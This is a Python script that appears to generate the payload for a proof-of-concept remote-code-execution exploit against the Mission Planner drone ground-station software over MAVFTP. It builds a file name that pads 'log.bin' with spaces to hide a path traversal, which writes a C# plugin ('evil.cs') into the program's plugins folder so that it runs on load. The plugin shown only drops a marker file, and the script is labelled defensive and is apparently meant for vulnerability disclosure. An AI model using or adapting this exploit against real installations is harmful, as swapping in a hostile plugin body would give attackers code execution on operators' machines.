#!/usr/bin/env python3
"""Generate the MAVFTP payload entry served by poc_G01_mp_mavftp_plugin_rce.py.

The entry's *filename* is the exploit: it is what Mission Planner feeds to
Path.Combine(). It is generated here rather than committed to the repository
because a file literally named

    log.bin<spaces>..\\..\\..\\..\\..\\..\\Program Files (x86)\\Mission Planner\\plugins\\evil.cs

cannot be checked out on Windows and trips antivirus and repository malware
scanning on every platform.

The payload *contents* are inert: the plugin writes one timestamped marker file
to %TEMP% and exits. Only the path is hostile.

Usage:  python3 make_payload.py
"""

import os

HERE = os.path.dirname(os.path.abspath(__file__))
SERVE_DIR = os.path.join(HERE, "ftp")

# Visible prefix, then enough padding that the traversal tail scrolls off the
# right edge of Mission Planner's fixed-width Name column.
VISIBLE_PREFIX = "log.bin"
PADDING = " " * 35
TRAVERSAL = "\\".join(
    ["", "..", "..", "..", "..", "..", "..", "Program Files (x86)", "Mission Planner", "plugins", "evil.cs"]
)
ENTRY_NAME = VISIBLE_PREFIX + PADDING + TRAVERSAL.lstrip("\\")

PLUGIN_SOURCE = """// loadassembly: System.Windows.Forms
using System;
using System.IO;
using MissionPlanner.Plugin;

namespace MarkerPocPlugin
{
    public class Plugin : MissionPlanner.Plugin.Plugin
    {
        public override string Name { get { return "MAVFTP-Traversal-PoC (benign)"; } }
        public override string Version { get { return "1.0"; } }
        public override string Author { get { return "infected-drones defensive PoC"; } }

        public override bool Init() { return true; }

        public override bool Loaded()
        {
            // BENIGN proof-of-execution: drop a marker file. Nothing destructive.
            try
            {
                string marker = Path.Combine(Path.GetTempPath(), "mp_plugin_poc_marker.txt");
                File.WriteAllText(marker, "MAVFTP path-traversal plugin RCE PoC reached code execution at " + DateTime.Now);
            }
            catch { }
            return true;
        }

        public override bool Exit() { return true; }
    }
}
"""


def main():
    os.makedirs(SERVE_DIR, exist_ok=True)
    path = os.path.join(SERVE_DIR, ENTRY_NAME)
    with open(path, "w", newline="\r\n") as fh:
        fh.write(PLUGIN_SOURCE)
    print("wrote %d bytes" % len(PLUGIN_SOURCE))
    print("entry name: %r" % ENTRY_NAME)
    print("served from: %s" % SERVE_DIR)
    print()
    print("Mission Planner will show only %r in the Name column." % VISIBLE_PREFIX)


if __name__ == "__main__":
    main()
